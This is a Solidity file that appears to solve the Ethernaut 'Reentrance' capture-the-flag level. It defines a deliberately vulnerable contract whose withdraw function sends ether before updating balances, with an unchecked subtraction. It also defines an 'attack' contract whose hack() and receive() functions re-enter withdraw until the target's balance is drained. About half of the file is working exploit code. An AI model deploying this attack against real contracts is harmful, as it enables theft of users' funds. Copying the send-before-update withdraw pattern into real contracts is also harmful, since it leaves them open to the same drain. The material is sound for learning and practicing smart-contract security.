// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts@3.4.2/math/SafeMath.sol";


contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract attack {

    Reentrance public rent;
    uint256 public withdraw_amount = 0.001 ether;

    constructor(Reentrance _rent) public {
        rent = Reentrance(_rent);
    }

    function hack() public payable  {
        rent.donate{value: withdraw_amount}(address(this));
        rent.withdraw(withdraw_amount);
    }

    receive() external payable {
        if (address(rent).balance > 0 ether) {
            rent.withdraw(withdraw_amount);
        }
    }
}